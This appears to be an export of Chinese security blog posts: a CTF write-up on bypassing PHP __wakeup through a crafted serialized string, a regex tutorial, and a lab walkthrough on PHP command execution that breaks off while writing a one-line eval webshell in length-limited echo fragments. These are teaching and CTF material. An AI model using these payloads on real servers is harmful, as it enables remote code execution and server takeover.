<div class="hljs"><pre><code>&lt;?php
class Student{
public $full_name = &apos;zhangsan&apos;;
public $score = 150;
public $grades = array();

function __wakeup() {
echo &quot;__wakeup is invoked&quot;;
}
}

$s = new Student();
var_dump(serialize($s));
?&gt;</code></pre></div><hr>
<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre></div><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
<p>最后执行运行的代码如下:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
<span class="hljs-keyword">public</span> $full_name = <span class="hljs-string">'zhangsan'</span>;
<span class="hljs-keyword">public</span> $score = <span class="hljs-number">150</span>;
<span class="hljs-keyword">public</span> $grades = <span class="hljs-keyword">array</span>();

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup is invoked"</span>;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
var_dump(<span class="hljs-keyword">$this</span>);
&#125;
&#125;

$s = <span class="hljs-keyword">new</span> Student();
$stu = unserialize(<span class="hljs-string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>


<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;
<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
&#125;
?code=</code></pre></div>

<hr>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
&#125;
&#125;
$test = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
<span class="hljs-keyword">echo</span>(serialize($test));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>输出结果</p>
<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2020/11/01/preg/</url>
    <content><![CDATA[<p>在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！</p>
<a id="more"></a>

<h1 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h1><p><a href="https://www.runoob.com/regexp/regexp-example.html" target="_blank" rel="noopener">详情见这</a></p>
<p>菜鸡教程中介绍的很详细。</p>
<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符<strong>\</strong> 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
<table>
<thead>
<tr>
<th align="left">特别字符</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$</td>
<td align="right">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</td>
</tr>
<tr>
<td align="left">( )</td>
<td align="right">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="right">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="right">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="right">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</td>
</tr>
<tr>
<td align="left">[</td>
<td align="right">标记一个中括号表达式的开始。要匹配 [，请使用\[。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="right">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td align="left">\</td>
<td align="right">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="right">匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td align="left">{</td>
<td align="right">标记限定符表达式的开始。要匹配 {，请使用 \{。</td>
</tr>
<tr>
<td align="left">|</td>
<td align="right">指明两项之间的一个选择。要匹配 |，请使用 \</td>
</tr>
</tbody></table>
<h2 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h2><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 <strong>*** 或 **+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="left">{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<h1 id="常用的正则表达式及含义"><a href="#常用的正则表达式及含义" class="headerlink" title="常用的正则表达式及含义"></a>常用的正则表达式及含义</h1><p><a href="http://c.runoob.com/front-end/854" target="_blank" rel="noopener">参考</a></p>
<div class="hljs"><pre><code class="hljs markdown">一、校验数字的表达式

<span class="hljs-bullet">1. </span>数字：^[0-9]*$			// ^表示字符的开始，$表示结束  [0-9] 表示字符串中的字符在0-9中

<span class="hljs-bullet">2. </span>n位的数字：^\d&#123;n&#125;$    // \d与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数

<span class="hljs-bullet">3. </span>至少n位的数字：^\d&#123;n,&#125;$      //&#123;n,&#125;至少n次

<span class="hljs-bullet">4. </span>m-n位的数字：^\d&#123;m,n&#125;$     //&#123;n,m&#125;  n-m次

<span class="hljs-bullet">5. </span>零和非零开头的数字：^(0|[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$  // | 是或者意思，表示匹配左右两个子表达式其中一个都可以

<span class="hljs-bullet">6. </span>非零开头的最多带两位小数的数字：^([<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)+(.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)?$    // +匹配前面的表达式一次或多次 (.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)? 表示匹配  (.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[<span class="hljs-string">1-9</span>]或者0.[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">1-9</span>]

<span class="hljs-bullet">7. </span>带1-2位小数的正数或负数：^(\-)?\d+(\.\d&#123;1,2&#125;)?$     // (\-)? 匹配一次或零次负号 

<span class="hljs-bullet">8. </span>正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$     // \- \+ \.是将特殊字符转义

<span class="hljs-bullet">9. </span>有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$    

<span class="hljs-bullet">10. </span>有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$

<span class="hljs-bullet">11. </span>非零的正整数：^[<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*$ 或 ^([1-9][0-9]*</span>)&#123;1,3&#125;$ 或 ^\+?[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*$   // [1-9] 控制非零

<span class="hljs-bullet">12. </span>非零的负整数：^\-[<span class="hljs-string">1-9</span>][<span class="hljs-symbol"></span>]0-9"<span class="hljs-emphasis">*$ 或 ^-[1-9]\d*</span>$  //一下的表达式的含义可以以此类推（感觉不是很常用）

<span class="hljs-bullet">13. </span>非负整数：^\d+$ 或 ^[1-9]\d*|0$

<span class="hljs-bullet">14. </span>非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$

<span class="hljs-bullet">15. </span>非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>|0?\.0+|0$

<span class="hljs-bullet">16. </span>非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>))|0?\.0+|0$

<span class="hljs-bullet">17. </span>正浮点数：^[<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>$ 或 ^(([<span class="hljs-string">0-9</span>]+\.[<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>\.[<span class="hljs-string">0-9</span>]+)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>))$

<span class="hljs-bullet">18. </span>负浮点数：^-([<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>)$ 或 ^(-(([<span class="hljs-string">0-9</span>]+\.[<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>\.[<span class="hljs-string">0-9</span>]+)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)))$

<span class="hljs-bullet">19. </span>浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>|0?\.0+|0)$</code></pre></div>



<div class="hljs"><pre><code class="hljs angelscript">二、校验字符的表达式
<span class="hljs-number">1.</span> 汉字：^[\u4e00-\u9fa5]&#123;<span class="hljs-number">0</span>,&#125;$   <span class="hljs-comment">//u4e00是unicode中第一个汉字编码 u9fa5是最后一个</span>

<span class="hljs-number">2.</span> 英文和数字：^[A-Za-z0<span class="hljs-number">-9</span>]+$ 或 ^[A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">4</span>,<span class="hljs-number">40</span>&#125;$  <span class="hljs-comment">//[A-Za-z0-9]可以匹配大小写字母数字 </span>

<span class="hljs-number">3.</span> 长度为<span class="hljs-number">3</span><span class="hljs-number">-20</span>的所有字符：^.&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;$  <span class="hljs-comment">// .代表任意字符包括换行符</span>

<span class="hljs-number">4.</span> 由<span class="hljs-number">26</span>个英文字母组成的字符串：^[A-Za-z]+$

<span class="hljs-number">5.</span> 由<span class="hljs-number">26</span>个大写英文字母组成的字符串：^[A-Z]+$

<span class="hljs-number">6.</span> 由<span class="hljs-number">26</span>个小写英文字母组成的字符串：^[a-z]+$

<span class="hljs-number">7.</span> 由数字和<span class="hljs-number">26</span>个英文字母组成的字符串：^[A-Za-z0<span class="hljs-number">-9</span>]+$ <span class="hljs-comment">//与第二个表达式相同</span>

<span class="hljs-number">8.</span> 由数字、<span class="hljs-number">26</span>个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;$   <span class="hljs-comment">//  \w=[0-9A-Za-z_]</span>

<span class="hljs-number">9.</span> 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>_]+$
 
<span class="hljs-number">10.</span> 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]+$ 或 ^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">20</span>&#125;$
 
<span class="hljs-number">11.</span> 可以输入含有^%&amp;<span class="hljs-string">',;=?$\"等字符：[^%&amp;'</span>,;=?$\x22]+ 

<span class="hljs-number">12</span> 禁止输入含有~的字符：[^~\x22]+  <span class="hljs-comment">//这里的 ^是非的意思</span></code></pre></div>

<p>下面这些就不一一解释了，实在太多了有的还是重复。</p>
<div class="hljs"><pre><code class="hljs markdown">三、特殊需求表达式
<span class="hljs-bullet">1. </span>Email地址：^\w+([-+.]\w+)<span class="hljs-emphasis">*@\w+([-.]\w+)*</span>\.\w+([-.]\w+)*$

<span class="hljs-bullet">2. </span>域名：[<span class="hljs-string">a-zA-Z0-9</span>][<span class="hljs-symbol">-a-zA-Z0-9</span>]&#123;0,62&#125;(/.[<span class="hljs-string">a-zA-Z0-9</span>][<span class="hljs-symbol">-a-zA-Z0-9</span>]&#123;0,62&#125;)+/.?

<span class="hljs-bullet">3. </span>InternetURL：[a-zA-z]+://[^\s]<span class="hljs-emphasis">* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*</span>)?$

<span class="hljs-bullet">4. </span>手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d&#123;8&#125;$

<span class="hljs-bullet">5. </span>电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：^(\(\d&#123;3,4&#125;-)|\d&#123;3.4&#125;-)?\d&#123;7,8&#125;$

<span class="hljs-bullet">6. </span>国内电话号码(0511-4405222、021-87888822)：\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;

<span class="hljs-bullet">7. </span>身份证号(15位、18位数字)：^\d&#123;15&#125;|\d&#123;18&#125;$

<span class="hljs-bullet">8. </span>短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$

<span class="hljs-bullet">9. </span>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[<span class="hljs-string">a-zA-Z</span>][<span class="hljs-symbol">a-zA-Z0-9_</span>]&#123;4,15&#125;$

<span class="hljs-bullet">10. </span>密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w&#123;5,17&#125;$

<span class="hljs-bullet">11. </span>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.<span class="hljs-emphasis">*\d)(?=.*</span>[a-z])(?=.*[A-Z]).&#123;8,10&#125;$

<span class="hljs-bullet">12. </span>日期格式：^\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;

<span class="hljs-bullet">13. </span>一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$

<span class="hljs-bullet">14. </span>一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$

14 钱的输入格式：

15    1.有四种钱的表示形式我们可以接受:"10000.00" 和 "10,000.00", 和没有 "分" 的 "10000" 和 "10,000"：^[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*$ 

16    2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符"0"不通过,所以我们采用下面的形式：^(0|[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$ 

17    3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$ 

18    4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 

19    5.必须说明的是,小数点后面至少应该有1位数,所以"10."是不通过的,但是 "10" 和 "10.2" 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 

20    6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 

21    7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 

22    8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 

23    备注：这就是最终结果了,别忘了"+"可以用"*"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里

24 xml文件：^([<span class="hljs-string">a-zA-Z</span>]+-?)+[<span class="hljs-string">a-zA-Z0-9</span>]+\\.[<span class="hljs-string">x|X</span>][<span class="hljs-symbol">m|M</span>][<span class="hljs-string">l|L</span>]$

25 中文字符的正则表达式：[\u4e00-\u9fa5]

26 双字节字符：[^\x00-\xff]    (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))

27 空白行的正则表达式：\n\s*\r    (可以用来删除空白行)

28 HTML标记的正则表达式：<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">(\S*?)[^</span>&gt;</span></span>]<span class="hljs-emphasis">*&gt;.*</span>?<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">\1</span>&gt;</span></span>|<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">.*?</span> /&gt;</span></span>    (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)

29 首尾空白字符的正则表达式：^\s<span class="hljs-emphasis">*|\s*</span>$或(^\s<span class="hljs-emphasis">*)|(\s*</span>$)    (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)

30 腾讯QQ号：[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]&#123;4,&#125;    (腾讯QQ号从10000开始)

31 中国邮政编码：[1-9]\d&#123;5&#125;(?!\d)    (中国邮政编码为6位数字)

32 IP地址：\d+\.\d+\.\d+\.\d+    (提取IP地址时有用)

33 IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) 

34 将url的协议，主机名，端口号，文件路径放到数组中:
var str = "http://www.runoob.com:80/html/html-tutorial.html";
var patt1 = /(\w+):\/\/([^/:]+)(:\d<span class="hljs-emphasis">*)?([^# ]*</span>)/;   //四个子表达式组合在一起，(\w+): 匹配字符串开始到: ([^/:]+) 匹配非/ 非:后的内容  (:\d<span class="hljs-emphasis">*)? 匹配:后的若干数字且表达式重复一次或多次  ([^# ]*</span>) 匹配不包括#或空格字符的任何字符序列</code></pre></div>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>rce</title>
    <url>/2020/11/29/rce/</url>
    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
<a id="more"></a>

<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system('ls', $return_var);</span>
<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>



<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec('ls');</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre></div>



<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><div class="hljs"><pre><code class="hljs gams">exec(<span class="hljs-string">'ls'</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>



<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
<p>例如</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">"phpinfo();"</span>);
<span class="hljs-keyword">eval</span>(<span class="hljs-string">"system('dir');"</span>);
<span class="hljs-keyword">eval</span>(<span class="hljs-string">"echo 'hello!';"</span>);

<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre></div>



<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">php官方手册</a></p>
<p>用法如下</p>
<div class="hljs"><pre><code class="hljs autoit">$a = <span class="hljs-string">'system'</span><span class="hljs-comment">;</span>
$b = <span class="hljs-string">'dir'</span><span class="hljs-comment">;</span>
$c = <span class="hljs-string">'assert'</span><span class="hljs-comment">;</span>
$d = <span class="hljs-string">'phpinfo()'</span><span class="hljs-comment">;</span>
call_user_func($a,$b)<span class="hljs-comment">;</span>
call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre></div>

<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><div class="hljs"><pre><code class="hljs php">$a = create_function(<span class="hljs-string">'$code'</span>,<span class="hljs-string">'echo $code;'</span>);
$b = <span class="hljs-string">'hello'</span>;
$a($b);
$a = <span class="hljs-string">'phpinfo();'</span>;
$b = create_function(<span class="hljs-string">''</span>,$a);
$b();

<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">($b)</span></span>&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'$b'</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span><span class="hljs-params">()</span></span>&#123;
    phpinfo();
&#125;</code></pre></div>



<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
<p>实验目的</p>
<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(strlen($_GET[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
    <span class="hljs-keyword">echo</span> strlen($_GET[<span class="hljs-number">1</span>]);
    <span class="hljs-keyword">echo</span> shell_exec($_GET[<span class="hljs-number">1</span>]);
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"It's too long!"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>限制了参数1的字符长度为15</p>
<p>然后将传递的参数放到shell_exec中执行</p>
<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
<p>所以想要够的payload的为</p>
<div class="hljs"><pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre></div>

<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" srcset="/img/loading.gif" alt="muma.png"></p>
<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
<p>例如下面</p>
<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" srcset="/img/loading.gif" alt="echo.png"></p>
<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" srcset="/img/loading.gif" alt="yanzheng.png"></p>
<p>下面就可以做这个题目了</p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
?<span class="hljs-number">1</span>=echo \&lt;\?php &gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo eval\( &gt;&gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo \$_GET &gt;&gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
